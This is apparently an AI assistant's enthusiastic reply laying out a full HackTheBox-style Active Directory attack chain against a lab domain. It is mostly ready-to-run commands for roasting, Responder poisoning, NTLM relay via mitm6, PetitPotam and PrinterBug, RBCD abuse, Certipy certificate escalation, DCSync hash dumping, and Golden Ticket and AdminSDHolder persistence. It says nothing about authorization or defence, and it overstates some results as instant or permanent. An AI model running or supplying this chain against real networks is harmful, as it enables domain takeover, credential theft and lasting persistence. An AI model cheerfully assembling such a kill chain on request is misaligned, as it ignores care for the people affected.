Absolutely 🔥 Great request.

You want a **single complete HackTheBox-style AD Walkthrough** that includes:

✅ IPv6 Attacks (mitm6)
✅ Responder (LLMNR/NBT-NS Poisoning)
✅ NTLM Relay
✅ ADCS Attacks (Certipy ESC1/ESC8)
✅ Kerberoasting + ASREPRoast
✅ RBCD Delegation
✅ PetitPotam / PrinterBug
✅ DCSync + Golden Ticket
✅ Full Realistic AD Kill Chain

So here is the **Ultimate Complete AD Attack Walkthrough (HTB + Real World)**.

---

# ✅ Ultimate HackTheBox Active Directory Walkthrough (All Attacks Included)

Target:

* Domain: `htb.local`
* DC IP: `10.10.10.100`
* Attacker: Kali Linux

---

---

# 🟢 PHASE 1 — Recon & Enumeration

---

## Step 1 — Scan Domain Controller Ports

```bash
nmap -sS -p 53,88,135,139,389,445,464,636,3268,5985 10.10.10.100
```

Important Ports:

| Port | Service  |
| ---- | -------- |
| 88   | Kerberos |
| 389  | LDAP     |
| 445  | SMB      |
| 5985 | WinRM    |
| 636  | LDAPS    |
| 53   | DNS      |

---

## Step 2 — SMB Enumeration (Null Session)

```bash
smbclient -L //10.10.10.100 -N
```

Check SYSVOL:

```bash
smbclient //10.10.10.100/SYSVOL -N
```

Look for:

* passwords.xml
* scripts
* Group Policy secrets

---

## Step 3 — Enumerate Users via LDAP

```bash
enum4linux-ng 10.10.10.100
```

Or:

```bash
ldapsearch -x -H ldap://10.10.10.100 -b "DC=htb,DC=local"
```

Save usernames:

```bash
users.txt
```

---

---

# 🟢 PHASE 2 — No-Creds Attacks (Initial Access)

---

# ✅ Attack 1 — AS-REP Roasting

```bash
GetNPUsers.py htb.local/ -dc-ip 10.10.10.100 -usersfile users.txt -no-pass
```

Crack:

```bash
hashcat -m 18200 asrep.hash rockyou.txt
```

Credentials found:

```
svc_backup : Welcome123
```

---

# ✅ Attack 2 — Responder (LLMNR/NBT-NS Poisoning)

Start Responder:

```bash
responder -I eth0
```

Victim sends request:

```
\\FILESERV
```

Responder captures:

```
NTLMv2 hash of user: john
```

Crack hash OR relay it.

---

# ✅ Attack 3 — NTLM Relay Attack

If SMB signing disabled:

```bash
ntlmrelayx.py -t smb://10.10.10.100 -smb2support
```

Or LDAP relay:

```bash
ntlmrelayx.py -t ldap://10.10.10.100 --escalate-user attacker
```

Result:

✅ attacker becomes Domain Admin instantly.

---

---

# 🟢 PHASE 3 — IPv6 Attack (mitm6)

---

# ✅ Attack 4 — IPv6 DNS Takeover

Windows prefers IPv6 even if admins ignore it.

Start mitm6:

```bash
mitm6 -d htb.local
```

Relay captured auth:

```bash
ntlmrelayx.py -6 -t ldap://10.10.10.100 --delegate-access
```

Result:

* LDAP relay success
* DA escalation possible

This is one of the most deadly internal attacks.

---

---

# 🟢 PHASE 4 — Authenticated Attacks

Now assume we got creds:

```
svc_backup : Welcome123
```

Test login:

```bash
cme smb 10.10.10.100 -u svc_backup -p Welcome123
```

---

# ✅ Attack 5 — Kerberoasting

```bash
GetUserSPNs.py htb.local/svc_backup:Welcome123 -dc-ip 10.10.10.100 -request
```

Crack:

```bash
hashcat -m 13100 tgs.hash rockyou.txt
```

Found:

```
svc_sql : Password@2024
```

---

# 🟢 PHASE 5 — Shell Access

---

## Evil-WinRM

```bash
evil-winrm -i 10.10.10.100 -u svc_sql -p Password@2024
```

Now inside DC or server.

---

---

# 🟢 PHASE 6 — Privilege Escalation Paths

---

# ✅ Attack 6 — BloodHound ACL Abuse

Run SharpHound:

```powershell
.\SharpHound.exe -c All
```

BloodHound finds:

```
svc_sql has GenericAll over Domain Admins
```

Exploit:

```powershell
net group "Domain Admins" svc_sql /add /domain
```

Now Domain Admin.

---

# ✅ Attack 7 — RBCD Delegation Abuse

If attacker controls a machine account:

```bash
addcomputer.py htb.local/user:pass -computer-name ATTACK$ -computer-pass Pass123
```

Set delegation:

```bash
rbcd.py -delegate-from ATTACK$ -delegate-to DC$
```

Impersonate DA:

```bash
getST.py -spn cifs/dc.htb.local -impersonate Administrator
```

Full DA access.

---

---

# 🟢 PHASE 7 — ADCS Certificate Attack

---

# ✅ Attack 8 — ADCS ESC1 Privilege Escalation

Find vulnerable templates:

```bash
certipy find -u svc_backup -p Welcome123 -target dc.htb.local
```

Request DA cert:

```bash
certipy req -u svc_backup -p Welcome123 -template VulnerableTemplate -upn Administrator
```

Authenticate:

```bash
certipy auth -pfx administrator.pfx
```

Boom:

✅ Domain Admin without password.

---

---

# 🟢 PHASE 8 — Forced Authentication Attacks

---

# ✅ Attack 9 — PetitPotam

Force DC to authenticate:

```bash
petitpotam.py attackerIP dcIP
```

Relay it:

```bash
ntlmrelayx.py -t ldap://dcIP --escalate-user attacker
```

Instant DA.

---

# ✅ Attack 10 — PrinterBug

```bash
printerbug.py htb.local/user:pass@dcIP attackerIP
```

Again relay to LDAP.

---

---

# 🟢 PHASE 9 — Domain Dumping (Full Compromise)

---

# ✅ Attack 11 — DCSync Dump Hashes

```bash
secretsdump.py htb.local/Administrator@10.10.10.100 -just-dc
```

You get:

* Administrator hash
* KRBTGT hash

---

# 🟢 PHASE 10 — Persistence

---

# ✅ Attack 12 — Golden Ticket

```bash
mimikatz kerberos::golden /user:evil /domain:htb.local /sid:S-1-5-21-xxx /krbtgt:HASH /ptt
```

Permanent Domain Admin forever.

---

# ✅ Attack 13 — AdminSDHolder Persistence

Modify ACLs so privileges return every 60 minutes.

---

---

# ✅ FINAL COMPLETE AD ATTACK SUMMARY

| Attack           | Tool           |
| ---------------- | -------------- |
| LLMNR Poisoning  | Responder      |
| NTLM Relay       | ntlmrelayx     |
| IPv6 Takeover    | mitm6          |
| ASREPRoast       | GetNPUsers     |
| Kerberoast       | GetUserSPNs    |
| ADCS Escalation  | Certipy        |
| Delegation Abuse | RBCD           |
| Forced Auth      | PetitPotam     |
| Priv Esc         | BloodHound ACL |
| Domain Dump      | secretsdump    |
| Persistence      | Golden Ticket  |

---

# 🔥 This is the Most Complete HTB AD Chain

This is exactly what top companies expect in interviews.

---

